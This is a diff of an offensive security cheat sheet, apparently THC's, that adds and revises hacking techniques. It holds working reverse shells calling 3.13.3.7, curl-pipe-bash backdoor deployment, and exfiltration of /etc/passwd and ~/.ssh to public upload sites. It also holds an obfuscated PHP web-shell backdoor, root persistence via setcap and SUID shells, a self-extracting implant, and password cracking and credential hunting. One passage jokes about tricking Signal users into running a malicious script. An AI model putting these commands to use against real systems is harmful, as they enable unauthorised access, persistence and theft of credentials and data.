+graftcp nmap -n -Pn -sV -F --open 19.168.1.1
+```
+
+---
 <a id="your-ip"></a>
 **3.v. Find your public IP address**
 
@@ -545,6 +795,7 @@ curl -x socks5h://localhost:9050 -s https://check.torproject.org/api/ip
 ### Result should be {"IsTor":true...
 ```
 
+---
 <a id="check-reachable"></a>
 **3.vi. Check reachability from around the world**
 
@@ -558,6 +809,7 @@ ooniprobe list
 ooniprobe list 1
 ```
 
+---
 <a id="check-open-ports"></a>
 **3.vii. Check/Scan Open Ports on an IP**
 
@@ -569,21 +821,54 @@ curl https://internetdb.shodan.io/1.1.1.1
 Fast (-F) vulnerability scan
 ```shell
 # Version gathering
-nmap -sCV -F -Pn --min-rate 10000 scanme.nmap.org
+nmap nmap -n -Pn -sCV -F --open --min-rate 10000 scanme.nmap.org
 # Vulns
 nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
 ```
 
+Using bash:
+```shell
+timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
+```
+
+---
 <a id="bruteforce"></a>
 **3.viii. Crack Password hashes**
 
+ 1. [NTLM2password](https://ntlm.pw/) to crack (lookup) NTLM passwords
+ 2. [wpa-sec](https://wpa-sec.stanev.org) to crack (lookup) WPA PSK passwords
+
+HashCat is our go-to tool for everything else:
 ```shell
-hashcat --username -w3 my-hash /usr/share/wordlists/rockyou.txt
+hashcat my-hash /usr/share/wordlists/rockyou.txt
 ```
 
-Read the [FAQ](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions) or use [Crackstation](https://crackstation.net) or [ColabCat/cloud](https://github.com/someshkar/colabcat)/[Cloudtopolis](https://github.com/JoelGMSec/Cloudtopolis) or on [AWS](https://akimbocore.com/article/hashcracking-with-aws/).
+Using a [10-days 7-16 char hashmask](https://github.com/sean-t-smith/Extreme_Breach_Masks/) on GPU:
+```sh
+curl -fsSL https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010-days/10-days_7-16.hcmask -o 10-days_7-16.hcmask
+# -d2 == Use GPU #2 only (device #2)
+# -O  == Up to 50% faster but limits password length to <= 15
+# -w1 == workload low (-w3 == high)
+nice -n 19 hashcat -o cracked.txt my-hash.txt -w1 -a3 10-days_7-16.hcmask -O -d2
+```
 
-**3.ix. Brute Force Passwords**
+Crack OpenSSH's `known_hosts` hashes to reveal the IP address:
+```shell
+curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/ipv4_hcmask.txt -o ipv4_hcmask.txt
+curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/kh-converter.py -o kh-converter.py
+python kh-converter.py ~/.ssh/known_hosts >~/.ssh/known_hosts_hashes
+hashcat -m 160 --quiet --hex-salt ~/ssh/known_hosts_hashes -a 3 ipv4_hcmask.txt 
+```
+
+👉 Read the [FAQ](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions).
+
+Be aware that `$6$` hashes are SLOW. Even the [1-minute 7-16 char hashmask](https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/01%20instant_1-minute/1-minute_7-16.hcmask) would take many days on a 8xRTX4090 cluster to complete.
+
+Rent a RTX-4090 GPU-Cluster at [vast.ai](https://www.vast.ai) for $0.40/h and use [dizcza/docker-hashcat:cuda](https://hub.docker.com/r/dizcza/docker-hashcat) ([read more](https://adamsvoboda.net/password-cracking-in-the-cloud-with-hashcat-vastai/)).
+
+Otherwise, use [Crackstation](https://crackstation.net), [shuck.sh](https://shuck.sh/), [ColabCat/cloud](https://github.com/someshkar/colabcat)/[Cloudtopolis](https://github.com/JoelGMSec/Cloudtopolis) or crack on your own [AWS](https://akimbocore.com/article/hashcracking-with-aws/) instances.
+
+**3.xi. Brute Force Passwords / Keys**
 
 The following is for brute forcing (guessing) passwords of ONLINE SERVICES.
 
@@ -608,6 +893,7 @@ Tools:
 * [THC Hydra](https://sectools.org/tool/hydra/)
 * [Medusa](https://www.geeksforgeeks.org/password-cracking-with-medusa-in-linux/) / [docs](http://foofus.net/goons/jmk/medusa/medusa.html)
 * [Metasploit](https://docs.rapid7.com/metasploit/bruteforce-attacks/)
+* [Crowbar](https://github.com/galkan/crowbar) - great for trying all ssh keys on a target IP range.
 
 Username & Password lists:
 * `/usr/share/nmap/nselib/data`  
@@ -790,6 +1076,7 @@ xxd -p </etc/issue.net
 xxd -p -r >issue.net-COPY
 ```
 
+---
 <a id="cut-paste"></a>
 ### 4.ii. File transfer - using cut & paste
 
@@ -800,6 +1087,7 @@ cat >output.txt <<-'__EOF__'
 __EOF__  ### Finish your cut & paste by typing __EOF__
 ```
 
+---
 <a id="file-transfer-screen"></a>
 ### 4.iii. File transfer - using *screen*
 
@@ -852,6 +1140,7 @@ Get *screen* to slurp the base64 encoded data into screen's clipboard and paste 
 
 Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
+---
 <a id="file-transfer-gs-netcat"></a>
 ### 4.iv. File transfer - using gs-netcat and sftp
 
@@ -867,21 +1156,120 @@ export GSOCKET_ARGS="-s MySecret"                        # Workstation
 sftp -D gs-netcat                                        # Workstation
 ```
 
-<a id="http"></a>
-### 4.v. File transfer - using HTTP
+Or to DUMP a single file:
+```sh
+# On the sender
+gs-netcat -l <"FILENAME" # Will output a SECRET used by the receiver
 
+# On the receiver
+gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
+```
+
+---
+<a id="http"></a>
+### 4.v. File transfer - using HTTPs
+
+#### Download from Server to Receiver:
+
+On the Sender/Server:
 ```sh
 ## Spawn a temporary HTTP server and share the current working directory.
-python -m http.server 8080
-```
-
-```sh
-## Request a temporary tunnel on a public domain
+python -m http.server 8080 --bind 127.0.0.1 &
+# alternative: php -S 127.0.0.1:8080
 cloudflared tunnel -url localhost:8080
 ```
+Receiver: Access the URL from any browser to view/download the remote file system.
 
-<a id="burl"></a>
-### 4.vi. File transfer without curl
+#### 1 - Upload using PHP:
+
+On the Receiver:
+```posh
+curl -fsSL -o upload_server.php https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/upload_server.php
+mkdir upload
+(cd upload; php -S 127.0.0.1:8080 ../upload_server.php &>/dev/null &)
+cloudflared tunnel --url localhost:8080 --no-autoupdate
+```
+
+On the Sender:
+```posh
+# Set a function:
+up() { curl -fsSL -F "file=@${1:?}" https://ABOVE-URL-HERE.trycloudflare.com; }
+# upload files like so:
+up warez.tar.gz
+up /etc/passwd
+```
+
+#### 2 - Upload using PYTHON:
+
+On the Receiver:
+```posh
+pip install uploadserver
+python -m uploadserver &
+cloudflared tunnel -url localhost:8000
+```
+
+On the Sender:
+```posh
+curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfile.txt'
+```
+
+---
+<a id="download"></a>
+### 4.vi. File download without curl
+
+Using Python, download only:
+```sh
+# Declare a curl-alternative
+purl() {
+    local url="${1:?}"
+    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
+    "$(which python3 || which python || which python2 || which false)" -c "\
+import urllib.request
+import sys
+import ssl
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", timeout=10, context=ctx).read())"
+}
+# purl ipinfo.io
+```
+
+Example: Installing gsocket with purl:
+```sh
+# cut & paste the above purl() function into your bash. Then cut & paste the following:
+source <(purl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh) \
+&& bin curl \
+&& bash -c "$(curl -fsSL https://gsocket.io/y)" \
+&& xdestruct
+```
+
+Using OpenSSL, download only:
+```sh
+surl() {
+    local r="${1#*://}"
+    local opts=("-quiet" "-ign_eof")
+    IFS=/ read -r host query <<<"${r}"
+    openssl s_client --help 2>&1| grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
+    openssl s_client --help 2>&1| grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
+    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
+	| openssl s_client "${opts[@]}" -connect "${host%%:*}:443" \
+	| sed '1,/^\r\{0,1\}$/d'
+}
+# surl ipinfo.io
+```
+
+using Perl, download only:
+```sh
+lurl() {
+    local url="${1:?}"
+    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
+    perl -e 'use LWP::Simple qw(get);
+my $url = '"'${1:?}'"';
+print(get $url);'
+}
+# lurl ipinfo.io
+```
 
 Using bash, download only:
 ```sh
@@ -896,10 +1284,87 @@ burl() {
 # PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
 ```
 
-<a id="webdav"></a>
-### 4.vii. File transfer - using WebDAV
+---
+<a id="trans"></a>
+### 4.vii. File transfer using a public dump
 
-On your workstation (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
+Cut & paste into your bash:
+```sh
+transfer() {
+    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
+    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1}"; return; }
+    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
+    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1##*/}.tar.gz"; return; }
+    curl -SsfL --progress-bar -T "$1" "https://transfer.sh/${1##*/}"
+}
+```
+
+then upload a file or a directory:
+```sh
+transfer /etc/passwd  # A single file
+transfer ~/.ssh       # An entire directory
+(curl ipinfo.io; hostname; uname -a; cat /proc/cpuinfo) | transfer "$(hostname)"
+```
+A list of our [favorite public upload sites](#cloudexfil).
+
+---
+<a id="rsync"></a>
+### 4.viii. File transfer - using rsync
+
+Ideal for synchronizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.
+
+Receiver:
+```posh
+echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
+mkdir upload
+rsync --daemon --port=31337 --config=r.conf --no-detach
+```
+
+Sender:
+```posh
+rsync -av warez rsync://1.2.3.4:31337/up
+```
+
+The same encrypted (OpenSSL):
+
+Receiver:
+```posh
+# use rsa:2048 if ed25519 is not supported (e.g. rsync connection error)
+openssl req -subj '/CN=example.com/O=EL/C=XX' -new -newkey ed25519 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
+cat ssl.key ssl.crt >ssl.pem
+rm -f ssl.key ssl.crt
+mkdir upload
+cat ssl.pem
+socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem EXEC:"rsync --server -logtprR --safe-links --partial upload"
+```
+
+Sender:
+```posh
+# Copy the ssl.pem from the Receiver to the Sender and send directory named 'warez'
+IP=1.2.3.4
+PORT=31337
+# Using rsync + socat-ssl
+up1() {
+   rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:${IP:?}:${PORT:-31337},cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@"  0:
+}
+# Using rsync + openssl
+up2() {
+   rsync -ahPRv -e "bash -c 'openssl s_client -connect ${IP:?}:${PORT:-31337} -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- "$@"  0:
+}
+up1 /var/www/./warez
+up2 /var/www/./warez
+```
+
+Rsync can be combined to exfil via [https / cloudflared raw TCP tunnels](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
+(To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).
+
+Pro Tip: Lazy hackers just type `exfil` on segfault.net.
+
+---
+<a id="webdav"></a>
+### 4.ix. File transfer - using WebDAV
+
+On the receiver (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
 ```sh
 cloudflared tunnel --url localhost:8080 &
 # [...]
@@ -917,7 +1382,7 @@ On another server:
 curl -T file.dat https://example-foo-bar-lights.trycloudflare.com
 # Create a directory remotely
 curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources
-# Create a directory hirachy remotely
+# Create a directory hierarchy remotely
 find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
 # Upload all *.c files (in parallel):
 find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}
@@ -933,8 +1398,9 @@ Or mount the WebDAV share on Windows (Z:/):
 net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
+---
 <a id="tg"></a>
-### 4.viii. File transfer to Telegram
+### 4.x. File transfer to Telegram
 
 There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
 ```sh
@@ -951,20 +1417,21 @@ curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocu
 <a id="reverse-shell"></a>
 ## 5. Reverse Shell / Dumb Shell
 <a id="reverse-shell-gs-netcat"></a>
-**5.i.a. Reverse shell with gs-netcat**
+**5.i.a. Reverse shell with gs-netcat (encrypted)**
 
-Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
+Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell. Both, the YOU and the remote system, can be behind NAT and the traffic is routed via a relay network. It also supports file upload/download (Ctrl-e c) and alarms when the admin logs in. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
 
 ```sh
-gs-netcat -s MySecret -l -i    # Host
+X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
+# or X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
 ```
-Use -D to start the reverse shell in the background (daemon) and with a watchdog to auto-restart if killed.
 
 To connect to the shell from your workstation:
 ```sh
-gs-netcat -s MySecret -i
+S=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
+# or gs-netcat -s ExampleSecretChangeMe -i
+# Add -T to tunnel through TOR
 ```
-Use -T to tunnel trough TOR.
 
 <a id="reverse-shell-bash"></a>
 **5.i.b. Reverse shell with Bash**
@@ -972,6 +1439,12 @@ Use -T to tunnel trough TOR.
 Start netcat to listen on port 1524 on your system:
 ```sh
 nc -nvlp 1524
+```
+After connection, [upgrade](#reverse-shell-interactive) your shell to a fully interactive PTY shell. Alternatively use [pwncat-cs](https://pwncat.org/) instead of netcat:
+```sh
+pwncat -lp 1524
+# Press "Ctrl-C" if pwncat gets stuck at "registered new host ...".
+# Then type "back" to get the prompt of the remote shell.
 ```
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
@@ -984,39 +1457,89 @@ bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 ```
 
+<a id="curlshell"></a>
+**5.i.c. Reverse shell with cURL (encrypted)**
+
+Use [curlshell](https://github.com/SkyperTHC/curlshell). This also works through proxies and when direct TCP connection to the outside world is prohibited:
+```sh
+# On YOUR workstation
+# Generate SSL keys:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
+# Start your listening server:
+./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
+```
+```sh
+# On the target:
+curl -skfL https://3.13.3.7:8080 | bash
+```
+
+<a id="curltelnet"></a>
+**5.i.d Reverse shell with cURL (cleartext)**
+
+Start ncat to listen for multiple connections:
+```sh
+ncat -kltv 1524
+```
+```sh
+# On the target:
+C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+```
+
+<a id="sslshell"></a>
+**5.i.e. Reverse shell with OpenSSL (encrypted)**
+
+```sh
+# On YOUR workstation:
+# Generate SSL keys:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
+# Start your listening server:
+openssl s_server -port 1524 -cert cert.pem -key key.pem
+# Or pwncat:
+# pwncat -lp 1524 --ssl
+```
+
+```sh
+# On the target, start an openssl reverse shell as background process:
+({ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- 2>/dev/null | sh 2>&3 >&3 3>&- ; } 3>&1 | : & )
+```
+
 <a id="reverse-shell-no-bash"></a>
-**5.i.c. Reverse shell without Bash**
+**5.i.f. Reverse shell without /dev/tcp**
 
 Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
 On the remote system:
 
 ```sh
-nc -e /bin/bash -vn 3.13.3.7 1524
+nc -e /bin/sh -vn 3.13.3.7 1524
 ```
 
 Variant if *'-e'* is not supported:
 ```sh
-mkfifo /tmp/.io
-sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
+{ nc -vn 3.13.3.7 1524 </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
+```
+
+* On modern shells this can be shortened to `{ nc 3.13.3.7 1524 </dev/fd/2|sh;} 2>&1|:`. (*thanks IA_PD*).  
+* The `| :` trick won't work on C-Shell/tcsh (FreeBSD), original Bourne shell (Solaris) or Korn shell (AIX). Use `mkfifo` instead.
+
+Variant for older */bin/sh*:
+```sh
+mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
 ```
 
 Telnet variant:
 ```sh
-mkfifo /tmp/.io
-sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
+mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
 ```
 
 Telnet variant when mkfifo is not supported (Ulg!):
 ```sh
-(touch /dev/shm/.fio; sleep 60; rm -f /dev/shm/.fio) &
-tail -f /dev/shm/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/dev/shm/.fio
+touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
 ```
-Note: Use */tmp/.fio* if */dev/shm* is not available.
-Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
+Note: Dont forget to `rm /tmp/.fio` after login.
 
 <a id="revese-shell-remote-moe"></a>
-**5.i.d. Reverse shell with remote.moe and ssh**
+**5.i.g. Reverse shell with remote.moe and ssh (encrypted)**
 
 It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
 
@@ -1043,13 +1566,13 @@ rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p &
 ```
 
 <a id="reverse-shell-python"></a>
-**5.i.e. Reverse shell with Python**
+**5.i.h. Reverse shell with Python**
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 <a id="reverse-shell-perl"></a>
-**5.i.f. Reverse shell with Perl**
+**5.i.i. Reverse shell with Perl**
 
 ```sh
 # method 1
@@ -1058,7 +1581,7 @@ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotob
 perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 <a id="reverse-shell-php"></a>
-**5.i.g. Reverse shell with PHP**
+**5.i.j. Reverse shell with PHP**
 
 ```sh
 php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
@@ -1087,24 +1610,25 @@ exec python -c 'import pty; pty.spawn("/bin/bash")'
 ...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:
 
 ```sh
-# On the target host spwan a PTY using any of the above examples:
+# On the target host spawn a PTY using any of the above examples:
 python -c 'import pty; pty.spawn("/bin/bash")'
 # Now Press Ctrl-Z to suspend the connection and return to your own terminal.
 ```
 
 ```
 # On your terminal execute:
-stty raw -echo opost; fg
+stty raw -echo icrnl opost; fg
 ```
 
-```
+```sh
 # On target host
 export SHELL=/bin/bash
 export TERM=xterm-256color
-reset
-stty rows 24 columns 120
+reset -I
+stty -echo;printf "\033[18t";read -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F";" '{ printf "rows "$3" cols "$2; }')
 # Pimp up your prompt
-PS1='{THC} USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
+# PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
+PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
 ```
 
 <a id="reverse-shell-socat"></a>
@@ -1125,11 +1649,16 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 
 Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
 ```sh
-bash -c "$(curl -fsSLk https://gsocket.io/x)"
+bash -c "$(curl -fsSLk https://gsocket.io/y)"
 ```
 or
 ```sh
-bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
+bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"
+```
+
+or deploy gsocket by running your own deployment server:
+```sh
+LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' instead of '/y'
 ```
 
 <a id="backdoor-background-reverse-shell"></a>
@@ -1185,14 +1714,17 @@ Other methods:
 * [Gost/Cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) - our very own article
 * [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.
 
-<a id="carriage-return-backdoor"></a>
+<a id="php-backdoor"></a>
 **6.iv. Smallest PHP Backdoor**
 
 Add this line to the beginning of any PHP file:
 ```php
-<?php $i=base64_decode("aWYoaXNzZXQoJF9HRVRbMF0pKXtlY2hvIGAkX0dFVFswXWA7ZXhpdDt9");eval($i);?>
+<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
 ```
-(Thanks @dono for making this 3 bytes smaller than the smallest)
+It is base64 encoding of:
+```php
+if(isset($_POST[0])){system($_POST[0]);die;}
+```
 
 Test the backdoor:
 ```sh
@@ -1204,25 +1736,166 @@ curl http://127.0.0.1:8080/test.php
 curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
 ```
 
+Sometimes `system()` is prohibited. Add `eval()` to allow remote PHP-code execution as a backup. Hide within other base64-comments for some obfuscation:
+```php
+<?PHP /*1rUY9TDs2wG8In1HkSQzqViVtX2nGidgu/RkzKNJbfho9NqtfTaww4GcR6bIGU+U1AJq
+USOIjliQm4T/9HP6YS6IMhwoZzmr2iydbwDcVynDqtLjI5i7owLKmjbKnijTszoXP/dif9ZcbhtJ
+WQKmhCno0boYQQ2rjHgW3su1C7pYREPSdrYD/4QBpptJU7Djnm5zuyD2TXNjHXm/ZYUW+n4s3PM7
+aWqzWzy*/if(isset($_POST[0])){eval($_POST[1]?:"");system($_POST[0]);die;}/*P
+0KKBW1rvtqxOK8L9Ok6y7Rulkl2um62KVxvVx/+kODDw4HZV5Yx/HK/7lG+X/IkK8LViCIuaedXl
+HM1wHBlDluhe8BN6pH33fn0bfFpjCDaKrKwK3QF6ExJu1JgKK9deyWUTcqbr0dhe7ZliOIldh3of
++4qUjhVdK4SoeND/Dd+iwRAbhZKxaHfng4ADqdWrwjUPoyTjzOp6C3iDzunviiG0RC3iDuCY*/?>
+```
+
+Trigger with any of these to execute comand or PHP code:
+```shell
+# Execute just command
+curl http://127.0.0.1:8080/x.php -d0='id'
+# Execute just PHP code
+curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts");'
+```
+
 <a id="ld-backdoor"></a>
 **6.v. Local Root Backdoor**
 
-Stay root once you got root
+#### 1. Backdooring the dynamic loader with setcap
+
 ```bash
-### Execute as root user
-setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+### Execute as ROOT user
+fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
+setcap cap_setuid,cap_setgid+ep "${fn}"
 ```
-Become root
+
 ```bash
-### Execute as non-root user
-/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+### Execute as non-root user to get root
+fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
+p="$(command -v python3 2>/dev/null)" || p="$(command -v python)"
+"${fn:?}" "$p" -c 'import os;os.setuid(0);os.setgid(0);os.execlp("bash", "kdaemon")'
+```
+
+#### 2. Good old b00m shell
+
+```shell
+{ cp /bin/sh /var/tmp/.b00m; chmod 6775 /var/tmp/.b00m; } 2>/dev/null >/dev/null
+```
+
+```shell
+exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'
+```
+
+<a id="implant"></a>
+**6.vi. Self-Extracting implant**
+
+Create a self-extracting shell-script using [mkegg.sh](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/mkegg.sh) (see source for examples).
+
+Simple example:
+```sh
+# Create implant 'egg.sh' containing the file 'foo'
+# and the directory 'warez'. When executing 'egg.sh' then
+# extract 'foo' and 'warez' and call 'warez/run/sh'
+./mkegg.sh egg.sh foo warez warez/run.sh
+```
+
+Real world examples are best:
+1. Create an implant that installs gsocket and calls our webhook on success:
+```sh
+./mkegg.sh egg.sh deploy-all.sh '(GS_WEBHOOK_KEY=e90d4b38-8285-490d-b5ab-a6d5c7c990a7 deploy-all.sh 2>/dev/null >/dev/null &)'
+# On the target system do: 'cat egg.sh | bash' or './egg.sh'
+```
+
+2. Rename `egg.sh` to `update-for-fools.txt` and upload as blob to [Signal's](https://www.signal.org/) GitHub repository.
+
+3. Don't fool people to update Signal using this command ❤️:
+```sh
+curl -fL https://github.com/signalapp/Signal-Desktop/files/15037868/update-for-fools.txt | bash
+```
+
+<a id="hostrecon"></a>
+## 7. Host Recon
+---
+
+Get [essential information](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/whatserver.sh) about a host:
+```sh
+bash -c "$(curl -fsSL https://thc.org/ws)"
+```
+or
+```sh
+bash -c "$(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh)"
+```
+
+netstat if there is no netstat/ss/lsof:
+```sh
+curl -fsSL https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/tools/awk_netstat.sh | bash
+```
+
+Speed check the system
+```sh
+curl -fsSL https://bench.sh | bash
+# Another speed check:  
+# curl -fsSL https://yabs.sh | bash
+```
+
+Find all suid/sgid binaries:
+```
+find  / -xdev -type f -perm /6000  -ls 2>/dev/null
+```
+
+Find all writeable directories:
+```bash
+wfind() {
+    local arr dir
+
+    arr=("$@")
+    while [[ ${#arr[@]} -gt 0 ]]; do
+        dir=${arr[${#arr[@]}-1]}
+        unset "arr[${#arr[@]}-1]"
+        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
+        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
+    done
+}
+# Usage: wfind /
+# Usage: wfind /etc /var /usr 
+```
+
+Find local passwords (using [noseyparker](https://github.com/praetorian-inc/noseyparker)):
+```sh
+curl -o np -fsSL https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static
+chmod 700 np && \
+./np scan . && \
+./np report --color=always | less -R
+```
+(Or use [PassDetective](https://github.com/aydinnyunus/PassDetective) to find passwords in ~/.*history)
+
+Using `grep`:
+```sh
+# Find passwords (without garbage).
+grep -HEronasi  '.{,16}password.{,64}' .
+# Find TLS or OpenSSH keys:
+grep -r -F -- " PRIVATE KEY-----" .
+```
+
